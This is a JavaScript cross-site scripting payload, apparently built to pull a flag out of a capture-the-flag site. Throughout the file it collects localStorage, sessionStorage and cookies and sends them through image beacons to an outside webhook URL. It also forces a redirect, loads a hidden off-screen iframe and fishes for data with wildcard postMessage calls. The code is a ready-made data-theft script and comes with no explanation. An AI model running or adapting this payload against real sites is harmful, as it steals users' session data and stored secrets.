     console.log('🎯 UNIFIED PAYLOAD LOADED - Multi-Strategy Flag Extraction');

     // Send immediate confirmation with strategy detection
     function sendWebhook(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ?
     JSON.stringify(data[key]) : data[key]);
             });
             img.src =
     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/unified?' +
     params.toString();
             document.body.appendChild(img);
             console.log('Webhook sent:', data.status);
         } catch(e) { console.error('Webhook failed:', e); }
     }

     sendWebhook({
         status: 'UNIFIED_PAYLOAD_START',
         timestamp: new Date().toISOString(),
         current_domain: window.location.hostname,
         current_url: window.location.href,
         user_agent: navigator.userAgent,
         referrer: document.referrer || 'none'
     });

     // Strategy 1: If we're on CTF domain, extract flag directly
     if (window.location.hostname.includes('secjhu') ||
     window.location.hostname.includes('ctf')) {
         console.log('🎯 ON CTF DOMAIN - Direct flag extraction');

         sendWebhook({
             status: 'ON_CTF_DOMAIN_DIRECT_EXTRACTION',
             timestamp: new Date().toISOString(),
             domain: window.location.hostname
         });

         try {
             // Extract flag from localStorage
             const flag = localStorage.getItem('flag');
             const allStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 allStorage[key] = localStorage.getItem(key);
             }

             sendWebhook({
                 status: 'CTF_DOMAIN_FLAG_EXTRACTION_COMPLETE',
                 timestamp: new Date().toISOString(),
                 success: !!flag,
                 flag: flag || 'not_found',
                 all_localStorage: JSON.stringify(allStorage),
                 localStorage_length: localStorage.length,
                 domain: window.location.hostname
             });

             if (flag) {
                 console.log('🚩 FLAG CAPTURED ON CTF DOMAIN:', flag);

                 // Send flag confirmation multiple times with different methods
                 sendWebhook({
                     status: 'FLAG_CONFIRMED_CTF_DOMAIN',
                     flag: flag,
                     timestamp: new Date().toISOString(),
                     extraction_location: 'ctf_domain_localStorage'
                 });
             }

         } catch(e) {
             sendWebhook({
                 status: 'CTF_DOMAIN_EXTRACTION_ERROR',
                 error: e.message,
                 timestamp: new Date().toISOString()
             });
         }

     } else {
         // Strategy 2: We're on GitHub Pages - attempt redirect to CTF domain
         console.log('📄 ON GITHUB PAGES - Attempting redirect strategy');

         sendWebhook({
             status: 'GITHUB_PAGES_REDIRECT_STRATEGY',
             timestamp: new Date().toISOString(),
             current_domain: window.location.hostname
         });

         // First, try to extract what we can from current domain
         try {
             const currentStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 currentStorage[key] = localStorage.getItem(key);
             }

             sendWebhook({
                 status: 'GITHUB_PAGES_LOCAL_DATA',
                 timestamp: new Date().toISOString(),
                 localStorage_data: JSON.stringify(currentStorage),
                 localStorage_length: localStorage.length,
                 cookies: document.cookie || 'none',
                 sessionStorage_length: sessionStorage.length
             });

         } catch(e) {}

         // Attempt redirect to CTF domain
         setTimeout(() => {
             const ctfDomain = 'ctf.secjhu.club'; // Update this if you know the 
     exact CTF domain
             const redirectUrl = `https://${ctfDomain}/#messages`;

             sendWebhook({
                 status: 'ATTEMPTING_REDIRECT_TO_CTF',
                 timestamp: new Date().toISOString(),
                 target_url: redirectUrl,
                 target_domain: ctfDomain
             });

             console.log('🔄 Redirecting to CTF domain:', redirectUrl);

             // Set a flag to prevent infinite redirects
             if (!sessionStorage.getItem('redirect_attempted')) {
                 sessionStorage.setItem('redirect_attempted', 'true');
                 window.location.href = redirectUrl;
             } else {
                 sendWebhook({
                     status: 'REDIRECT_LOOP_PREVENTED',
                     timestamp: new Date().toISOString(),
                     message: 'Redirect already attempted'
                 });
             }

         }, 3000);
     }

     // Strategy 3: Try cross-frame communication
     try {
         if (window.parent !== window) {
             window.parent.postMessage({
                 type: 'FLAG_REQUEST',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_PARENT',
                 timestamp: new Date().toISOString()
             });
         }

         if (window.opener) {
             window.opener.postMessage({
                 type: 'FLAG_REQUEST',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_OPENER',
                 timestamp: new Date().toISOString()
             });
         }
     } catch(e) {}

     // Listen for postMessage responses
     window.addEventListener('message', function(event) {
         sendWebhook({
             status: 'POSTMESSAGE_RECEIVED',
             timestamp: new Date().toISOString(),
             message_origin: event.origin,
             message_data: JSON.stringify(event.data)
         });

         if (event.data && event.data.flag) {
             sendWebhook({
                 status: 'FLAG_RECEIVED_VIA_POSTMESSAGE',
                 timestamp: new Date().toISOString(),
                 flag: event.data.flag,
                 source_origin: event.origin
             });
         }
     });

     // Strategy 4: Try to create iframe to CTF domain (if not already on CTF 
     domain)
     if (!window.location.hostname.includes('secjhu') &&
     !window.location.hostname.includes('ctf')) {
         setTimeout(() => {
             try {
                 const iframe = document.createElement('iframe');
                 iframe.style.cssText =
     'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
                 iframe.src = 'https://ctf.secjhu.club/#messages';

                 iframe.onload = function() {
                     sendWebhook({
                         status: 'IFRAME_LOADED',
                         timestamp: new Date().toISOString(),
                         iframe_src: iframe.src
                     });

                     // Try to access iframe localStorage (will likely fail due to 
     CORS)
                     try {
                         const iframeStorage = iframe.contentWindow.localStorage;
                         const iframeFlag = iframeStorage.getItem('flag');

                         if (iframeFlag) {
                             sendWebhook({
                                 status: 'FLAG_EXTRACTED_FROM_IFRAME',
                                 timestamp: new Date().toISOString(),
                                 flag: iframeFlag
                             });
                         }
                     } catch(e) {
                         sendWebhook({
                             status: 'IFRAME_ACCESS_BLOCKED',
                             timestamp: new Date().toISOString(),
                             error: e.message
                         });
                     }
                 };

                 document.body.appendChild(iframe);

                 sendWebhook({
                     status: 'IFRAME_CREATED',
                     timestamp: new Date().toISOString(),
                     target: 'https://ctf.secjhu.club/#messages'
                 });

             } catch(e) {
                 sendWebhook({
                     status: 'IFRAME_CREATION_FAILED',
                     timestamp: new Date().toISOString(),
                     error: e.message
                 });
             }
         }, 5000);
     }

     // Send final status
     setTimeout(() => {
         sendWebhook({
             status: 'UNIFIED_PAYLOAD_COMPLETE',
             timestamp: new Date().toISOString(),
             domain: window.location.hostname,
             strategies_attempted: 4
         });
     }, 10000);

     console.log('🏁 Unified payload execution completed');
